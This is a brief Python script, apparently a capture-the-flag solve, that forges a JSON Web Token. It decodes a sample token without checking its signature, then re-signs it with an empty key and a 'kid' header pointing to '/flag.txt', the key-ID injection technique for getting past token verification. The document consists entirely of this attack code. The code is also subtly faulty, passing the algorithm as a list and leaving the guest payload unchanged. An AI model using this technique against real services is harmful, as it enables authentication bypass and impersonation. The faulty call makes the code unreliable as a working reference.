import jwt

token = "eyJhbGciOiJIUzI1NiIsImtpZCI6ImtleXMvcHVibGljLnBlbSIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjoiZ3Vlc3QiLCJyb2xlIjoiZ3Vlc3QifQ.xoCiZ57qIqZ-i-XWN8E_q_0jqDDrXYmW3KwD6VA4I6g"

decoded_payload = jwt.decode(token, options={"verify_signature": False})

print(decoded_payload)

headers = {
    "alg": "HS256",
    "kid": "/flag.txt",
    "typ": "JWT"
}

hacked_token = jwt.encode(decoded_payload, key="",algorithm=['HS256'], headers=headers)

print(hacked_token)